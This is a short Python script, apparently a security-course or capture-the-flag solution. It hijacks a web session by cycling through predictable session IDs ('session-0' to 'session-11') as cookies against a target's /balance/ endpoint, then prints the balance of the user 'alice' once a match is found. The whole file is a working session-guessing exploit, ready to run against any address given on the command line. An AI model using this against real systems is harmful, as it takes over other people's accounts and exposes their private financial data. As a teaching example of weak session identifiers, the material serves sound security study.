import sys
import requests
import json


def test_session(address):
    for i in range(0, 12):
        session_id = 'session-' + str(i)

        response = requests.get(
            address + '/balance/',
            cookies={'sessionid': session_id}
        )

        data = json.loads(response.text)

        if data['username'] == 'alice':
            return data['balance']

    return None


def main(argv):
    address = sys.argv[1]
    print(test_session(address))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('usage: python %s address' % sys.argv[0])
    else:
        main(sys.argv)